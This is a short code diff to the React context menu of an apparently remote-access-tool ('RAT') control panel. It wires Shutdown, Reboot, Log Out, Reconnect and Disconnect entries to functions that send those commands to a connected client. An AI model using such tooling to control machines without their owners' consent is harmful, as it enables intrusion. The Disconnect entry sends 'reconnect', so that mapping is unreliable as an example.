@@ -2,6 +2,7 @@ import React, { useContext, useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { RATContext } from "../rat/RATContext";
 import { ContextMenuProps, SubMenuProps } from "../../types";
+import { manageClientCmd, handleSystemCommandCmd } from "../rat/RATCommands";
 
 const menuOptions = [
   {
@@ -42,14 +43,20 @@ const menuOptions = [
       {
         label: "Shutdown",
         icon: <i className="ri-shut-down-line ri-2x text-error"></i>,
+        run: "shutdown",
+        function: handleSystemCommandCmd,
       },
       {
         label: "Reboot",
         icon: <i className="ri-restart-line ri-2x text-warning"></i>,
+        run: "reboot",
+        function: handleSystemCommandCmd,
       },
       {
         label: "Log Out",
         icon: <i className="ri-lock-line ri-2x text-info"></i>,
+        run: "logout",
+        function: handleSystemCommandCmd,
       },
     ],
     navigate: false,
@@ -61,10 +68,14 @@ const menuOptions = [
       {
         label: "Reconnect",
         icon: <i className="ri-triangle-line ri-2x text-success"></i>,
+        run: "reconnect",
+        function: manageClientCmd,
       },
       {
         label: "Disconnect",
         icon: <i className="ri-pentagon-line ri-2x text-error"></i>,
+        run: "reconnect",
+        function: manageClientCmd,
       },
     ],
   },
@@ -89,6 +100,12 @@ const SubMenu: React.FC<SubMenuProps> = ({
           onClick={() => {
             if (item.navigate && typeof item.path === "string") {
               navigate(item.path.replace("[ID]", id));
+            }
+            if (
+              typeof item.function == "function" &&
+              typeof item.run === "string"
+            ) {
+              item.function(String(id), item.run);
             }
             onClose();
           }}
